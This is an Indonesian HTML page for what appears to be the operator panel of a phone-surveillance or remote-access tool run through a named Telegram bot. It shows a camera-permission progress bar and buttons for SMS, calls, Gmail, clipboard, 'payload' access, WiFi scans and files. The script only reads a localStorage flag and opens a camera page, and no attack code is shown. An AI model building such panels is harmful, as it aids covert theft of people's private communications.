<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kontrol Perangkat</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0f0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }

        .container {
            max-width: 400px;
            width: 100%;
            background: #1a1e1e;
            border-radius: 32px;
            padding: 24px 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid #2a2f2f;
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        .header h1 {
            color: #00b8b8;
            font-size: 20px;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 500;
            border-bottom: 1px solid #2a2f2f;
            padding-bottom: 12px;
        }

        .progress-area {
            background: #0d1212;
            border-radius: 40px;
            padding: 16px;
            margin-bottom: 24px;
            border: 1px solid #2a3a3a;
        }

        .progress-label {
            display: flex;
            justify-content: space-between;
            color: #8a9f9f;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .progress-bar-bg {
            background: #1f2a2a;
            height: 12px;
            border-radius: 20px;
            overflow: hidden;
        }

        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00c3c3, #00f0f0);
            border-radius: 20px;
            transition: width 0.3s ease;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }

        .grid-item {
            background: #0f1515;
            border: 1px solid #253030;
            border-radius: 16px;
            padding: 16px 4px;
            text-align: center;
            color: #d0e0e0;
            font-size: 13px;
            font-weight: 400;
            transition: all 0.2s;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .grid-item:hover {
            background: #1a2626;
            border-color: #00b8b8;
            color: #ffffff;
        }

        .grid-item:active {
            transform: scale(0.97);
        }

        .nav-bottom {
            display: flex;
            justify-content: space-around;
            background: #0d1212;
            border-radius: 40px;
            padding: 10px 0;
            margin-top: 16px;
            border: 1px solid #253030;
        }

        .nav-item {
            color: #6b8a8a;
            font-size: 14px;
            font-weight: 500;
            text-transform: uppercase;
            cursor: default;
        }

        .nav-item.active {
            color: #00b8b8;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #3f5555;
        }

        .footer a {
            color: #00b8b8;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>AKSI PERANGKAT</h1>
        </div>

        <!-- Progress Izin -->
        <div class="progress-area">
            <div class="progress-label">
                <span>Izin Kamera</span>
                <span id="progress-text">0%</span>
            </div>
            <div class="progress-bar-bg">
                <div id="progress-bar" class="progress-bar-fill" style="width: 0%;"></div>
            </div>
        </div>

        <!-- Grid Aksi -->
        <div class="grid">
            <div class="grid-item" onclick="handleCamera()">📷 Camera</div>
            <div class="grid-item">✉️ Sms Baru</div>
            <div class="grid-item">📨 Sms Lama</div>
            <div class="grid-item">📞 Panggilan</div>
            <div class="grid-item">⚙️ Sistem</div>
            <div class="grid-item">📧 Gmail</div>
            <div class="grid-item">🌐 Jaringan</div>
            <div class="grid-item">🔔 Notifikasi</div>
            <div class="grid-item">📋 Clipboard</div>
            <div class="grid-item">📦 Akses payload</div>
            <div class="grid-item">📡 Cell Tower</div>
            <div class="grid-item">📶 WiFi Scan</div>
            <div class="grid-item">📁 File Manager</div>
            <div class="grid-item">🎛️ Kontrol</div>
            <div class="grid-item">🔒 BERNDA</div>
        </div>

        <!-- Navigasi bawah -->
        <div class="nav-bottom">
            <span class="nav-item">BERNDA</span>
            <span class="nav-item active">KOOTROL</span>
            <span class="nav-item">PROFIL</span>
        </div>

        <!-- Info Bot Telegram -->
        <div class="footer">
            <span>Bot: sket_control_xarch_bot | ID: 7528625787</span><br>
            <a href="https://t.me/sket_control_xarch_bot" target="_blank">Hubungi via Telegram</a>
        </div>
    </div>

    <script>
        // Fungsi untuk membaca status izin dari localStorage
        function updateProgress() {
            const permission = localStorage.getItem('cameraPermission');
            const progressFill = document.getElementById('progress-bar');
            const progressText = document.getElementById('progress-text');
            
            if (permission === 'granted') {
                progressFill.style.width = '100%';
                progressText.textContent = '100%';
            } else {
                progressFill.style.width = '0%';
                progressText.textContent = '0%';
            }
        }

        // Panggil saat halaman dimuat
        updateProgress();

        // Fungsi ketika tombol Camera diklik
        function handleCamera() {
            // Langsung menuju halaman kamera, di sana akan minta izin
            window.location.href = 'kamera.html';
        }

        // Opsional: refresh progress jika localStorage berubah (misal dari tab lain)
        window.addEventListener('storage', function(e) {
            if (e.key === 'cameraPermission') {
                updateProgress();
            }
        });
    </script>
</body>
</html>
